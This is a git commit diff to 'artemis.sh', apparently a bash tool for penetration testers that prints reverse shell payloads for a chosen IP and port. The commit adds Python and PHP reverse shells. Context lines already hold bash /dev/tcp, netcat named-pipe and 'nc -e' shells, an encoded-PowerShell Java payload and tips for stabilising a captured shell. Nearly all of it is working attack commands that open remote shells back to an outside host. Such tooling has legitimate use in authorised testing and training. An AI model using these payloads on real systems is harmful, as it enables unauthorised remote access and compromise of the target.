ff80c086df23d0b64bba1d749070b255b9036486
Komodo <144389222+Komodo-pty@users.noreply.github.com>
2024-09-05 13:54:02 -0700

    Add files via upload
    Added Python & PHP payloads

--- artemis.sh
+++ artemis.sh
@@ -1,5 +1,6 @@
 #!/bin/bash
 
+#To-DO: Add Ruby & Perl payloads
 line="\n============================================================\n"
 
 Help()
@@ -11,7 +12,7 @@ Help()
 	echo -e "-t <Target_OS>: Specify the target OS for Web shell payloads & for stabilization tips [win/nix]\n\n"
 	echo -e "-s <Payload_Type>: Specify the type of Reverse shell to generate (Refer to the Payloads section for a list of accepted arguments)\n$line"
 	echo -e "\nExample Syntax: artemis -i 10.10.144.68 -p 443 -s ps -t nix -l\n$line"	
-        echo -e "Payloads:\n\n[ps] Powershell\n[bash]\n[nc] Netcat for *nix targets\n[java]\n\n"
+        echo -e "Payloads:\n\n[ps] Powershell\n[bash]\n[nc] Netcat for *nix targets\n[java]\n[py] Python\n[php]\n\n"
 	echo -e "[!] Tip: If you're having trouble catching a shell, try the following steps-\n\n1) Double check your firewall settings & verify target's IP Address\n"
 	echo -e "2) Instead of getting a Reverse Shell, start capturing ICMP packets and use a payload to make the target ping you a few times\n"
 	echo -e "3) Use common ports for your Reverse shell (e.g. 80 or 443) or try ports that hosts in your target's LAN are using\n"
@@ -69,19 +70,19 @@ then
 	ip -c a
 	echo -e "\nEnter your IP Address: "
 	read host
-	echo -e $line
+	echo -e "$line"
 fi
 
 if [ -z "$port" ]
 then
         echo "Enter the Listener's port number"
         read port
-        echo -e $line
+        echo -e "$line"
 fi
 
 if [ -z "$shell" ]
 then
-	echo -e "\nSelect an operation:\n\n[1] Powershell\n[2] Bash\n[3] Netcat\n[4] Java"
+	echo -e "\nSelect an operation:\n\n[1] Powershell\n[2] Bash\n[3] Netcat\n[4] Java\n[5] Python\n[6] PHP\n"
 	read mode
 else
 	if [ "$shell" == "ps" ]
@@ -96,6 +97,12 @@ else
 	elif [ "$shell" == "java" ]
 	then
 		mode=4
+	elif [ "$shell" == "py" ]
+	then
+		mode=5
+	elif [ "$shell" == "php" ]
+	then
+		mode=6
 	else
 		echo -e "\nError: Invalid payload selected\nView the help menu with: artemis -h\n"
 		exit
@@ -119,13 +126,13 @@ then
 elif [ $mode == 2 ]
 then
 	echo -e "\nOutputting a basic Bash payload for $host:$port\n\n" 
-	echo -e "bash -i >& /dev/tcp/$host/$port 0>&1\n$line"
+	echo -e "bash -i >& /dev/tcp/$host/$port 0>&1"
 
 elif [ $mode == 3 ]
 then
 	echo -e "\nOutputting Netcat payloads for $host:$port\n\n[!] Tip: Named Pipe Payload is preferred and Alternate Payload only works for certain versions of Netcat\n\n"
 	echo -e "Named Pipe Payload:\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $host $port >/tmp/f\n\n"
-	echo -e "Alternate Payload:\nnc -e /bin/sh $host $port\n$line"
+	echo -e "Alternate Payload:\nnc -e /bin/sh $host $port"
 
 elif [ $mode == 4 ]
 then
@@ -161,7 +168,7 @@ then
 	then
 		PowerSHELL
 		echo -e "\nOutputting a Java payload for Windows target using $host:$port\n\n"
-		echo -e "$line\nWARNING: Verify this works with the space after payload / before the quotes in line 2. The Enc PS scripts adds the space\n$line"
+		echo -e "$line\nWARNING: Verify this works with the space after payload / before the quotes in line 2. The PowerSHELL function adds the space\n$line"
 		echo "r = Runtime.getRuntime()"
 		echo -n "p = r.exec([\"powershell.exe\", \"-enc\","; echo -n \"$payload\"; echo "] as String[])"
 #		echo "p = r.exec([\"powershell.exe\", \"-enc\", \"$payload\"] as String[])"
@@ -169,10 +176,27 @@ then
 
 	fi
 
+elif [ $mode == 5 ]
+then
+	echo -e "\n[!] Tip: Depending on the target, you may need to substitute 'python3' for 'python' or 'python2'. This payload is for a Linux target.\n\n"
+	echo -e "Outputting a Python payload for $host:$port\n"
+
+	echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$host\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+
+elif [ $mode == 6 ]
+then
+	echo -e "\n[!] Tip: You can use PHP to execute other payloads by placing them inside the exec() or system() functions. These payloads are for a Linux target.\n\n"
+	echo -e "Outputting PHP payloads for $host:$port\n\nBasic Payload (String):\n"
+
+	echo "php -r '\$sock=fsockopen(\"$host\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+	echo -e "\n\nAlternate Payload (PHP tags):\n"
+	echo "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/\"$host\"/$port 0>&1'\");?>"
 else
 	echo -e "\nYou did not select a valid option\n"
 	exit
 fi
+
+echo -e "$line"
 
 if [ -z "$target" ]
 then
@@ -217,7 +241,7 @@ then
 elif [ "$target" == "win" ]
 then
 	echo -e "\n\n{Manually Stabilizing a Windows Shell}\n"
-	echo -e "Use this shell to create a \"Backup Shell\" that you'll use. It may be more stable, but it's mainly in case you make the shell freeze while using it.\n\nSetup:\n"
+	echo -e "Use this shell to create a \"Backup Shell\" that you'll use. It may be more stable, but it's mainly in case you cause the shell to freeze while using it.\n\nSetup:\n"
 	echo "1) Navigate to a Writable Directory:"; echo "cd \users\public"
 	echo -e "\n2) Create a file with your payload:\nWrite-Output \"PAYLOAD\" > shell.ps1\n\nMethods:\n"
 	echo "1) Process: (Try with and without \"-NoNewWindow\")"; echo "Start-Process -NoNewWindow .\shell.ps1"
@@ -229,7 +253,7 @@ else
 	echo -e "\nYou did not select a valid option\n"
 fi
 
-echo -e $line
+echo -e "$line"
 
 if [ -z "$listen" ]
 then
